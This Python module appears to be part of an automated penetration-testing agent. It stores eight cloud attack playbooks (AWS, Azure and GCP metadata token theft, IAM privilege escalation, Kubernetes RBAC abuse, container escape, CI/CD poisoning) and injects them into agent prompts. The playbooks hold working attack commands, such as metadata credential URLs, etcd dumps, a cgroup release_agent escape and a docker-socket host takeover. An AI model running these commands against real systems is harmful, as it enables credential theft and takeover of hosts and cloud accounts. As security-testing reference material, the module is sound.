"""Cloud security knowledge base — attack patterns for cloud environments.

Deep knowledge about cloud vulnerabilities injected into agent prompts:
1. AWS attack patterns (IAM, S3, Lambda, EC2, SSRF)
2. Azure attack patterns (AD, Blob, Functions, RBAC)
3. GCP attack patterns (IAM, GCS, Cloud Functions, metadata)
4. Kubernetes attack patterns (RBAC, pods, secrets, escape)
5. Docker attack patterns (escape, privileged, capabilities)
6. CI/CD pipeline attacks (supply chain, secrets, artifacts)
7. Serverless function attacks
8. Cloud metadata exploitation
"""

from __future__ import annotations

from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class CloudAttackPattern:
    """A cloud attack pattern with methodology."""
    pattern_id: str = ""
    name: str = ""
    cloud_provider: str = ""       # aws, azure, gcp, k8s, docker, general
    category: str = ""
    severity: str = "high"
    description: str = ""
    testing_methodology: str = ""
    detection_indicators: list[str] = field(default_factory=list)
    exploitation_chain: str = ""
    mitre_techniques: list[str] = field(default_factory=list)
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:30],
            "provider": self.cloud_provider[:10],
            "severity": self.severity,
        }


CLOUD_ATTACK_PATTERNS: list[dict[str, Any]] = [
    # ── AWS ──
    {
        "id": "cloud-001", "name": "AWS IMDS Credential Theft",
        "provider": "aws", "category": "metadata", "severity": "critical",
        "desc": "Exploiting AWS Instance Metadata Service to steal IAM role credentials.",
        "testing": (
            "AWS IMDS CREDENTIAL THEFT:\n"
            "1. IDENTIFY SSRF: Find any endpoint that fetches URLs on behalf of the server\n"
            "2. IMDSv1 (no token required):\n"
            "   http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "   Returns the IAM role name. Then:\n"
            "   http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE_NAME}\n"
            "   Returns: AccessKeyId, SecretAccessKey, Token\n"
            "3. IMDSv2 (token required — harder but not impossible):\n"
            "   First get token: PUT http://169.254.169.254/latest/api/token\n"
            "   Header: X-aws-ec2-metadata-token-ttl-seconds: 21600\n"
            "   Then use token in subsequent requests\n"
            "4. BYPASS IMDSv2: If SSRF allows PUT method and custom headers\n"
            "5. ALTERNATIVE METADATA ENDPOINTS:\n"
            "   http://169.254.169.254/latest/user-data (startup scripts may contain secrets)\n"
            "   http://169.254.169.254/latest/meta-data/hostname\n"
            "   http://169.254.169.254/latest/dynamic/instance-identity/document\n"
            "6. POST-EXPLOITATION: Use stolen credentials with AWS CLI\n"
            "   aws sts get-caller-identity (confirm access)\n"
            "   aws s3 ls (enumerate S3 buckets)\n"
            "   aws iam list-roles (enumerate IAM)"
        ),
        "indicators": ["AWS", "EC2", "SSRF", "cloud", "metadata"],
        "chain": "SSRF → IMDS → IAM Credentials → AWS Account Compromise",
        "mitre": ["T1552.005"],
        "tools": ["curl", "aws-cli"],
    },
    {
        "id": "cloud-002", "name": "S3 Bucket Misconfiguration",
        "provider": "aws", "category": "storage", "severity": "high",
        "desc": "Publicly accessible or overly permissive S3 buckets.",
        "testing": (
            "S3 BUCKET TESTING:\n"
            "1. DISCOVER BUCKETS:\n"
            "   - DNS CNAME records pointing to s3.amazonaws.com\n"
            "   - JavaScript source code containing bucket names\n"
            "   - Google dork: site:s3.amazonaws.com {company}\n"
            "   - Brute-force common patterns: {company}-{env}-{service}\n"
            "2. TEST ACCESS:\n"
            "   aws s3 ls s3://{bucket} --no-sign-request (anonymous)\n"
            "   aws s3 ls s3://{bucket} (authenticated cross-account)\n"
            "3. TEST WRITE:\n"
            "   aws s3 cp test.txt s3://{bucket}/ --no-sign-request\n"
            "4. ACL CHECK:\n"
            "   aws s3api get-bucket-acl --bucket {bucket}\n"
            "   aws s3api get-bucket-policy --bucket {bucket}\n"
            "5. OBJECT-LEVEL:\n"
            "   aws s3api get-object-acl --bucket {bucket} --key {key}\n"
            "6. LOOK FOR: Backups, databases, credentials, PII, source code"
        ),
        "indicators": ["S3", "bucket", "aws", "blob"],
        "chain": "Bucket Discovery → Access Check → Data Exfiltration",
        "mitre": ["T1530"],
        "tools": ["aws-cli", "s3scanner"],
    },
    {
        "id": "cloud-003", "name": "AWS IAM Privilege Escalation",
        "provider": "aws", "category": "iam", "severity": "critical",
        "desc": "Escalating IAM privileges through misconfigurations.",
        "testing": (
            "AWS IAM PRIVILEGE ESCALATION:\n"
            "1. ENUMERATE CURRENT PERMISSIONS:\n"
            "   aws iam get-user / aws sts get-caller-identity\n"
            "   aws iam list-attached-user-policies --user-name {user}\n"
            "   aws iam list-user-policies --user-name {user}\n"
            "2. KNOWN PRIVESC PATHS:\n"
            "   a) iam:CreatePolicyVersion → create new version of own policy with admin perms\n"
            "   b) iam:SetDefaultPolicyVersion → set older, more permissive policy as default\n"
            "   c) iam:PassRole + lambda:CreateFunction → create Lambda with admin role\n"
            "   d) iam:PassRole + ec2:RunInstances → launch EC2 with admin role\n"
            "   e) iam:CreateLoginProfile → create console access for existing user\n"
            "   f) iam:UpdateLoginProfile → change another user's password\n"
            "   g) iam:AttachUserPolicy → attach AdministratorAccess to self\n"
            "   h) iam:PutUserPolicy → put inline admin policy on self\n"
            "   i) sts:AssumeRole → assume a more privileged role\n"
            "3. TOOLS: pacu, enumerate-iam, cloudfox, pmapper\n"
            "4. CHECK TRUST POLICIES: Roles that trust your account/principal"
        ),
        "indicators": ["IAM", "AWS", "role", "policy", "permissions"],
        "chain": "Low-privilege IAM → Policy Manipulation → Admin Access",
        "mitre": ["T1078.004"],
        "tools": ["pacu", "enumerate-iam"],
    },

    # ── Kubernetes ──
    {
        "id": "cloud-004", "name": "Kubernetes RBAC Exploitation",
        "provider": "k8s", "category": "rbac", "severity": "critical",
        "desc": "Exploiting Kubernetes RBAC misconfigurations for cluster compromise.",
        "testing": (
            "KUBERNETES RBAC EXPLOITATION:\n"
            "1. ENUMERATE ACCESS:\n"
            "   kubectl auth can-i --list (what can current service account do?)\n"
            "   kubectl auth can-i create pods\n"
            "   kubectl auth can-i get secrets\n"
            "2. DANGEROUS PERMISSIONS:\n"
            "   a) create pods → mount host filesystem, run privileged\n"
            "   b) get secrets → read all secrets in namespace (including tokens)\n"
            "   c) create serviceaccounts → create SA with cluster-admin\n"
            "   d) create clusterrolebindings → bind cluster-admin to self\n"
            "   e) create/patch deployments → inject containers\n"
            "3. TOKEN THEFT:\n"
            "   cat /var/run/secrets/kubernetes.io/serviceaccount/token\n"
            "   Use token to authenticate to API server\n"
            "4. ETCD ACCESS:\n"
            "   If etcd is exposed (port 2379), all cluster secrets are readable\n"
            "   ETCDCTL_API=3 etcdctl get --prefix /\n"
            "5. KUBELET API:\n"
            "   If kubelet API is unauthenticated (port 10250):\n"
            "   curl https://{node}:10250/pods/ (list pods)\n"
            "   curl https://{node}:10250/run/{ns}/{pod}/{container} (exec in pod)"
        ),
        "indicators": ["kubernetes", "k8s", "kubectl", "pod", "container"],
        "chain": "Service Account → RBAC Abuse → Cluster Admin → Node Compromise",
        "mitre": ["T1078.004", "T1613"],
        "tools": ["kubectl", "kubeletctl"],
    },
    {
        "id": "cloud-005", "name": "Container Escape",
        "provider": "docker", "category": "escape", "severity": "critical",
        "desc": "Escaping from a Docker container to the host.",
        "testing": (
            "CONTAINER ESCAPE TESTING:\n"
            "1. CHECK PRIVILEGED MODE:\n"
            "   cat /proc/1/status | grep CapEff (if all caps set → privileged)\n"
            "   If 0000003fffffffff → fully privileged\n"
            "2. PRIVILEGED ESCAPE:\n"
            "   mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape\n"
            "   echo 1 > /tmp/escape/notify_on_release\n"
            "   echo '/path/to/payload' > /tmp/escape/release_agent\n"
            "3. DOCKER SOCKET MOUNT:\n"
            "   ls -la /var/run/docker.sock (if accessible → full host access)\n"
            "   docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host\n"
            "4. SENSITIVE MOUNTS:\n"
            "   mount | grep -E '(proc|sys|dev)' (look for writable host paths)\n"
            "   Check /proc/1/root, /host mounts\n"
            "5. KERNEL EXPLOITS:\n"
            "   Check kernel version: uname -r\n"
            "   Known container escapes: CVE-2019-5736 (runc), CVE-2022-0185 (fs context)\n"
            "6. CAP_SYS_ADMIN:\n"
            "   If CAP_SYS_ADMIN → mount host filesystem\n"
            "   mount /dev/sda1 /mnt"
        ),
        "indicators": ["docker", "container", "kubernetes", "cgroup", "namespace"],
        "chain": "Container Shell → Capability Check → Escape → Host Compromise",
        "mitre": ["T1611"],
        "tools": ["deepce", "CDK"],
    },

    # ── CI/CD ──
    {
        "id": "cloud-006", "name": "CI/CD Pipeline Poisoning",
        "provider": "general", "category": "supply_chain", "severity": "critical",
        "desc": "Attacking CI/CD pipelines for supply chain compromise.",
        "testing": (
            "CI/CD PIPELINE ATTACK TESTING:\n"
            "1. IDENTIFY CI/CD: Look for GitHub Actions, GitLab CI, Jenkins, CircleCI, "
            "Travis CI configs in repo\n"
            "2. SECRETS IN PIPELINES:\n"
            "   - Check .github/workflows/*.yml for hardcoded secrets\n"
            "   - Check environment variables set in CI config\n"
            "   - Artifact stores may contain build secrets\n"
            "3. PR-TRIGGERED PIPELINES:\n"
            "   - If CI runs on PRs from forks → malicious PR can run code in CI\n"
            "   - Modify CI config in PR to exfiltrate secrets\n"
            "   - pull_request_target event in GitHub Actions is especially dangerous\n"
            "4. DEPENDENCY CONFUSION:\n"
            "   - Register internal package name on public registry\n"
            "   - CI/CD auto-installs public package over internal one\n"
            "5. ARTIFACT POISONING:\n"
            "   - If artifacts are pulled from writable locations\n"
            "   - Replace artifacts with malicious ones\n"
            "6. JENKINS SPECIFIC:\n"
            "   - /script endpoint → Groovy console → RCE\n"
            "   - /credentials endpoint → all stored credentials"
        ),
        "indicators": ["jenkins", "github actions", "gitlab ci", "circleci", "pipeline"],
        "chain": "Repo Access → Pipeline Trigger → Secret Exfiltration → Supply Chain Compromise",
        "mitre": ["T1195.002"],
        "tools": ["gh", "jenkins-cli"],
    },

    # ── Azure ──
    {
        "id": "cloud-007", "name": "Azure AD Token Abuse",
        "provider": "azure", "category": "iam", "severity": "critical",
        "desc": "Abusing Azure AD tokens for privilege escalation.",
        "testing": (
            "AZURE AD TOKEN ABUSE:\n"
            "1. TOKEN ACQUISITION:\n"
            "   - IMDS: curl -H 'Metadata: true' "
            "http://169.254.169.254/metadata/identity/oauth2/token"
            "?api-version=2018-02-01&resource=https://management.azure.com/\n"
            "   - Service Principal credentials in env vars/config files\n"
            "2. TOKEN ANALYSIS:\n"
            "   - Decode JWT (base64): header.payload.signature\n"
            "   - Check audience (aud), roles, scope, tenant\n"
            "3. PRIVILEGE ESCALATION:\n"
            "   - Use token to enumerate Azure resources\n"
            "   - Check for Global Admin role, Application Administrator\n"
            "   - Add credentials to existing service principals\n"
            "4. CONSENT GRANT:\n"
            "   - If Application.ReadWrite.All → grant admin consent to attacker app\n"
            "   - Illicit consent grant → phishing for app permissions\n"
            "5. MANAGED IDENTITY:\n"
            "   - If VM has managed identity → access Key Vault secrets\n"
            "   - If Function App has managed identity → escalate to other resources"
        ),
        "indicators": ["azure", "entra", "azure ad", "managed identity", "oauth"],
        "chain": "Token Theft → Scope Analysis → Privilege Escalation → Tenant Compromise",
        "mitre": ["T1550.001"],
        "tools": ["az-cli", "ROADtools"],
    },

    # ── GCP ──
    {
        "id": "cloud-008", "name": "GCP Metadata & Service Account Abuse",
        "provider": "gcp", "category": "metadata", "severity": "critical",
        "desc": "Exploiting GCP metadata service and service accounts.",
        "testing": (
            "GCP METADATA EXPLOITATION:\n"
            "1. METADATA SERVICE:\n"
            "   curl -H 'Metadata-Flavor: Google' "
            "http://metadata.google.internal/computeMetadata/v1/\n"
            "2. SERVICE ACCOUNT TOKEN:\n"
            "   http://metadata.google.internal/computeMetadata/v1/"
            "instance/service-accounts/default/token\n"
            "   Returns: access_token, expires_in, token_type\n"
            "3. PROJECT METADATA:\n"
            "   .../project/project-id (project ID)\n"
            "   .../project/attributes/ (custom metadata, may contain secrets)\n"
            "4. CUSTOM METADATA:\n"
            "   .../instance/attributes/ (instance-level custom metadata)\n"
            "   Check for startup-script (may contain credentials)\n"
            "5. SERVICE ACCOUNT SCOPES:\n"
            "   .../instance/service-accounts/default/scopes\n"
            "   If cloud-platform scope → full API access\n"
            "6. POST-EXPLOITATION:\n"
            "   Use access_token with gcloud CLI or REST APIs\n"
            "   gsutil ls (list GCS buckets)\n"
            "   gcloud projects list"
        ),
        "indicators": ["gcp", "google cloud", "gke", "gcr", "gcs"],
        "chain": "SSRF → GCP Metadata → Service Account Token → Project Compromise",
        "mitre": ["T1552.005"],
        "tools": ["gcloud", "gsutil"],
    },
]


class CloudSecurityKB:
    """Cloud security knowledge base.

    Provides detailed cloud attack methodologies that get injected
    into agent prompts for comprehensive cloud security assessment.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, CloudAttackPattern] = {}
        self._log = logger.bind(component="cloud_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load cloud attack patterns."""
        for data in CLOUD_ATTACK_PATTERNS:
            pattern = CloudAttackPattern(
                pattern_id=data["id"],
                name=data["name"],
                cloud_provider=data.get("provider", "general"),
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                testing_methodology=data.get("testing", ""),
                detection_indicators=data.get("indicators", []),
                exploitation_chain=data.get("chain", ""),
                mitre_techniques=data.get("mitre", []),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_patterns_for_provider(
        self,
        provider: str,
    ) -> list[CloudAttackPattern]:
        """Get attack patterns for a specific cloud provider."""
        return [
            p for p in self._patterns.values()
            if p.cloud_provider == provider.lower()
        ]

    def get_testing_prompts(
        self,
        providers: list[str] | None = None,
        max_patterns: int = 5,
    ) -> list[str]:
        """Get testing methodology prompts for agent context injection."""
        prompts = []
        for pattern in self._patterns.values():
            if providers and pattern.cloud_provider not in providers:
                continue
            if pattern.testing_methodology:
                prompts.append(pattern.testing_methodology)
            if len(prompts) >= max_patterns:
                break
        return prompts

    def detect_cloud_indicators(
        self,
        text: str,
    ) -> list[CloudAttackPattern]:
        """Detect which cloud patterns are relevant from text indicators."""
        text_lower = text.lower()
        relevant = []

        for pattern in self._patterns.values():
            for indicator in pattern.detection_indicators:
                if indicator.lower() in text_lower:
                    relevant.append(pattern)
                    break

        return relevant

    def build_cloud_testing_prompt(
        self,
        detected_providers: list[str] | None = None,
        max_patterns: int = 3,
    ) -> str:
        """Build a comprehensive cloud testing prompt."""
        relevant = []

        if detected_providers:
            for provider in detected_providers:
                relevant.extend(self.get_patterns_for_provider(provider))
        else:
            relevant = list(self._patterns.values())

        lines = ["## Cloud Security Testing Methodology\n"]
        for pattern in relevant[:max_patterns]:
            lines.append(f"### {pattern.name} [{pattern.severity.upper()}] ({pattern.cloud_provider.upper()})")
            lines.append(pattern.testing_methodology)
            if pattern.exploitation_chain:
                lines.append(f"Attack Chain: {pattern.exploitation_chain}")
            lines.append("")

        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        provider_counts: dict[str, int] = defaultdict(int)
        for p in self._patterns.values():
            provider_counts[p.cloud_provider] += 1
        return {
            "patterns": len(self._patterns),
            "by_provider": dict(provider_counts),
        }
